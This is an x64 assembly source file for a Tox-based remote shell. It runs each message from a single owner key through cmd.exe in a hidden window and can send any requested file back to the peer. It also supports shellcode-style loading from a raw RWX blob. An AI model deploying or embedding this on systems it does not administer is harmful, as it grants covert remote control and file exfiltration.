; remote.asm: a tiny SSH-like remote shell for your OWN PC, over Tox.
;
; Adds FRIEND_ID (config.inc) as the only friend. Because a Tox friend
; connection is end-to-end encrypted and bound to that public key, every
; message that arrives is provably from the owner - that is the authentication.
; Each message is run with `cmd.exe /c <message>` and its combined stdout/stderr
; is sent back to the owner. Runs until the process is closed.
;
; The owner key is the one credential: anyone holding its secret key gets a
; shell here, exactly like an SSH private key. There is no stealth, persistence
; or evasion - it is a visible program you run on a machine you administer.

default rel
bits 64

%include "macros.inc"
%include "config.inc"

IMPORT GetTickCount64
extern p_ExitProcess            ; resolved by runtime_boot, via the PEB
IMPORT CreatePipe
IMPORT CreateProcessA
IMPORT CloseHandle
IMPORT ReadFile
IMPORT PeekNamedPipe
IMPORT SetHandleInformation

extern toxnet_init, toxnet_add_friend, toxnet_iterate
extern toxnet_send_message, toxnet_receive_message
extern toxnet_file_send
extern save_regs, restore_regs
extern mem_cpy, mem_zero

OUTBUF_SIZE equ 65536

section .text
global main

; Flat-binary entry: remote.obj links first, so this is byte 0 of the blob.
; Loading remote.bin into a zeroed, RWX, SizeOfImage-sized region and jumping to
; offset 0 lands here, which tail-jumps to main. The PE keeps main as its own
; entry point, so remote.exe never executes this stub.
_bin_entry:
    jmp main

; send_retry(ecx = friend, rdx = ptr, r8d = len): send a reliable packet,
; draining the window with toxnet_iterate until it fits (bounded).
send_retry:
%assign FR 0
    PROLOG FR
    mov r12d, ecx
    mov r13, rdx
    mov r14d, r8d
    mov r15d, 400
.l:
    mov ecx, r12d
    mov rdx, r13
    mov r8d, r14d
    call toxnet_send_message
    test eax, eax
    jz .ok
    call toxnet_iterate
    dec r15d
    jnz .l
.ok:
    EPILOG FR

; run_cmd(ecx = friend, rdx = command, r8 = length): run `cmd.exe /c command`
; and stream its combined stdout/stderr back to the friend.
; Locals (base LOC(0) = rsp+64):
;   LOC(16)  bytesRead (DWORD)
;   LOC(20)  bytesAvailable (DWORD)
;   LOC(32)  SECURITY_ATTRIBUTES (24)
;   LOC(64)  hRead  / LOC(72) hWrite
;   LOC(80)  STARTUPINFOA (104)
;   LOC(184) PROCESS_INFORMATION (24)
;   LOC(216) command line buffer
;   LOC(1632) read buffer (1372)
run_cmd:
%assign FR 3200
    PROLOG FR
    mov r12d, ecx               ; friend
    mov r13, rdx                ; command
    mov r14, r8                 ; length
    ; inheritable pipe for the child's stdout/stderr
    lea rcx, [LOC(32)]
    mov edx, 24
    call mem_zero
    mov dword [LOC(32)], 24     ; nLength
    mov dword [LOC(48)], 1      ; bInheritHandle = TRUE
    lea rcx, [LOC(64)]          ; &hRead
    lea rdx, [LOC(72)]          ; &hWrite
    lea r8, [LOC(32)]           ; &sa
    xor r9d, r9d
    call WINAPI(CreatePipe)
    test eax, eax
    jz .ret
    mov rcx, [LOC(64)]          ; our read end must not be inherited by the child
    mov edx, 1                  ; HANDLE_FLAG_INHERIT
    xor r8d, r8d
    call WINAPI(SetHandleInformation)
    ; command line = cmd.exe /c  [cd /d "<cwd>" & ]  <command>  & echo MARKER & cd
    ; The leading cd starts in the saved directory and the trailing cd reports
    ; the directory after the command, so "cd foo" persists to later commands.
    lea rcx, [LOC(216)]
    lea rdx, [rel s_cmdprefix]
    mov r8d, 11
    call mem_cpy
    mov ebx, 11                 ; running cmdline length
    mov eax, [rel g_cwdlen]
    test eax, eax
    jz .nocwd
    lea rcx, [LOC(216) + rbx]
    lea rdx, [rel s_cdpfx]
    mov r8d, 7
    call mem_cpy
    add ebx, 7
    lea rcx, [LOC(216) + rbx]
    lea rdx, [rel g_cwd]
    mov r8d, [rel g_cwdlen]
    call mem_cpy
    add ebx, [rel g_cwdlen]
    lea rcx, [LOC(216) + rbx]
    lea rdx, [rel s_cdmid]
    mov r8d, 4
    call mem_cpy
    add ebx, 4
.nocwd:
    lea rcx, [LOC(216) + rbx]
    mov rdx, r13
    mov r8, r14
    call mem_cpy
    add ebx, r14d
    lea rcx, [LOC(216) + rbx]
    lea rdx, [rel s_cmdsuffix]
    mov r8d, 32
    call mem_cpy
    add ebx, 32
    mov byte [LOC(216) + rbx], 0
    ; STARTUPINFOA
    lea rcx, [LOC(80)]
    mov edx, 104
    call mem_zero
    mov dword [LOC(80)], 104        ; cb
    mov dword [LOC(80) + 60], 0x100 ; dwFlags = STARTF_USESTDHANDLES
    mov rax, [LOC(72)]              ; hWrite
    mov [LOC(80) + 88], rax         ; hStdOutput
    mov [LOC(80) + 96], rax         ; hStdError
    lea rcx, [LOC(184)]
    mov edx, 24
    call mem_zero
    ; CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
    xor ecx, ecx
    lea rdx, [LOC(216)]
    xor r8d, r8d
    xor r9d, r9d
    mov qword [rsp+32], 1
    mov qword [rsp+40], 0x08000000
    mov qword [rsp+48], 0
    mov qword [rsp+56], 0
    lea rax, [LOC(80)]
    mov [rsp+64], rax
    lea rax, [LOC(184)]
    mov [rsp+72], rax
    call WINAPI(CreateProcessA)
    test eax, eax
    jz .closeboth
    mov rcx, [LOC(72)]          ; close our copy of the write end -> ReadFile sees EOF at exit
    call WINAPI(CloseHandle)
    ; read the whole output into g_outbuf
    xor r15d, r15d              ; total length
.rd:
    ; Only read bytes already in the pipe; keep the single network thread
    ; running even when the child is quiet or continuously producing output.
    call toxnet_iterate
    mov rcx, [LOC(64)]
    xor edx, edx
    xor r8d, r8d
    xor r9d, r9d
    lea rax, [LOC(20)]
    mov [rsp+32], rax
    mov qword [rsp+40], 0
    call WINAPI(PeekNamedPipe)
    test eax, eax
    jz .readdone                ; all writers closed, or a pipe error
    mov ebx, [LOC(20)]
    test ebx, ebx
    jz .rd
    mov eax, OUTBUF_SIZE
    sub eax, r15d
    cmp eax, 4096
    jb .rdsz
    mov eax, 4096
.rdsz:
    test eax, eax
    jz .readdone
    cmp eax, ebx
    cmova eax, ebx              ; never wait for bytes the child hasn't written
    mov rcx, [LOC(64)]
    lea rdx, [rel g_outbuf]
    add rdx, r15
    mov r8d, eax
    lea r9, [LOC(16)]
    mov qword [rsp+32], 0
    call WINAPI(ReadFile)
    test eax, eax
    jz .readdone
    mov eax, [LOC(16)]
    test eax, eax
    jz .readdone
    add r15d, eax
    jmp .rd
.readdone:
    mov rcx, [LOC(184)]         ; hProcess
    call WINAPI(CloseHandle)
    mov rcx, [LOC(192)]         ; hThread
    call WINAPI(CloseHandle)
    mov rcx, [LOC(64)]          ; hRead
    call WINAPI(CloseHandle)
    ; find the marker in g_outbuf[0 .. r15)
    lea rsi, [rel g_outbuf]
    mov rbx, [rel s_marker]     ; needle bytes 0..7
    mov rbp, [rel s_marker + 8] ; needle bytes 8..15
    mov r8, -1
    xor r9d, r9d
.scan:
    lea eax, [r9d + 21]
    cmp eax, r15d
    ja .scandone
    lea r10, [rsi + r9]
    cmp [r10], rbx
    jne .scannext
    cmp [r10 + 8], rbp
    jne .scannext
    mov eax, [r10 + 16]
    cmp eax, dword [rel s_marker + 16]
    jne .scannext
    mov al, [r10 + 20]
    cmp al, byte [rel s_marker + 20]
    jne .scannext
    mov r8, r9
    jmp .scandone
.scannext:
    inc r9d
    jmp .scan
.scandone:
    cmp r8, -1
    je .send                    ; no marker: send the whole buffer (r15 = length)
    ; capture the new working directory printed after the marker
    lea rdi, [rsi + r8 + 21]
.skipnl:
    movzx eax, byte [rdi]
    cmp eax, 13
    je .skadv
    cmp eax, 10
    je .skadv
    cmp eax, 32
    je .skadv
    jmp .cwdcopy
.skadv:
    inc rdi
    jmp .skipnl
.cwdcopy:
    lea r11, [rel g_cwd]
    xor ecx, ecx
.cwdl:
    movzx eax, byte [rdi + rcx]
    test eax, eax
    jz .cwddone
    cmp eax, 13
    je .cwddone
    cmp eax, 10
    je .cwddone
    cmp ecx, 590
    jae .cwddone
    mov [r11 + rcx], al
    inc ecx
    jmp .cwdl
.cwddone:
    mov byte [r11 + rcx], 0
    mov [rel g_cwdlen], ecx
    ; body = output before the marker, trailing CR/LF stripped
    mov ecx, r8d
.strip:
    test ecx, ecx
    jz .stripdone
    movzx eax, byte [rsi + rcx - 1]
    cmp eax, 13
    je .strdec
    cmp eax, 10
    jne .stripdone
.strdec:
    dec ecx
    jmp .strip
.stripdone:
    mov r15d, ecx               ; send length = body length
.send:
    xor edi, edi                ; offset
.sendloop:
    mov eax, r15d
    sub eax, edi
    jz .ret
    mov ecx, eax
    cmp ecx, 1372
    jbe .ss
    mov ecx, 1372
.ss:
    mov ebx, ecx                ; chunk length
    mov r8d, ebx
    mov ecx, r12d
    lea rdx, [rel g_outbuf]
    add rdx, rdi
    call send_retry
    add edi, ebx
    jmp .sendloop
.closeboth:
    mov rcx, [LOC(64)]
    call WINAPI(CloseHandle)
    mov rcx, [LOC(72)]
    call WINAPI(CloseHandle)
.ret:
    EPILOG FR

main:
%assign FR 1536
    PROLOG FR
    lea rcx, [rel s_name]
    call toxnet_init
    test eax, eax
    jnz .fail
    lea rcx, [rel s_owner]      ; add FRIEND_ID (the owner) as our only friend
    xor edx, edx
    call toxnet_add_friend
    cmp eax, -1
    je .fail
    call WINAPI(GetTickCount64)
    mov r14, rax                ; last poll
.loop:
    call toxnet_iterate
    call WINAPI(GetTickCount64)
    mov rdi, rax
    sub rax, r14
    cmp rax, POLL_INTERVAL_MS
    jb .loop
    mov r14, rdi
.recv:
    lea rcx, [LOC(0)]
    mov edx, 1400
    lea r8, [LOC(1400)]
    call toxnet_receive_message
    cmp eax, -1
    je .loop                    ; runs forever, until the process is closed
    mov r15d, eax               ; message length
    test r15d, r15d
    jz .recv
    ; FTSEND<path> (prefix + NUL) asks us to send a file over the transfer
    ; protocol instead of running a shell command.
    cmp r15d, 7
    jb .cmd
    lea rsi, [LOC(0)]
    lea rdi, [rel s_ftsend]
    mov ecx, 7
.ftcmp:
    mov al, [rsi]
    cmp al, [rdi]
    jne .cmd
    inc rsi
    inc rdi
    dec ecx
    jnz .ftcmp
    ; matched: NUL-terminate the path (messages are <=1372, buffer is 1400) and
    ; hand it to the library, which offers and streams it from toxnet_iterate.
    mov r13d, [LOC(1400)]       ; sender friend (read before touching the buffer)
    lea rax, [LOC(0)]
    mov byte [rax + r15], 0
    mov ecx, r13d
    lea rdx, [LOC(7)]           ; path, after "FTSEND\0"
    call toxnet_file_send
    jmp .recv
.cmd:
    mov ecx, [LOC(1400)]        ; sender friend (only the owner can reach us)
    lea rdx, [LOC(0)]
    mov r8d, r15d
    call run_cmd
    jmp .recv
.fail:
    mov ecx, 1
    call [rel p_ExitProcess]    ; set in runtime_boot, before any DLL load

section .text
s_name:      db NAME, 0
s_owner:     db FRIEND_ID, 0
s_ftsend:    db "FTSEND", 0     ; 7-byte prefix marking a file-send request
s_cmdprefix: db "cmd.exe /c "
s_cdpfx:     db 'cd /d "'
s_cdmid:     db '" & '
s_marker:    db "__TOXNET_CWD_5b1c9d__"
; No space before the first '&': cmd would echo it as a trailing space.
s_cmdsuffix: db " & echo __TOXNET_CWD_5b1c9d__&cd"

section .bss
alignb 16
g_outbuf: resb OUTBUF_SIZE
g_cwd:    resb 600
g_cwdlen: resd 1
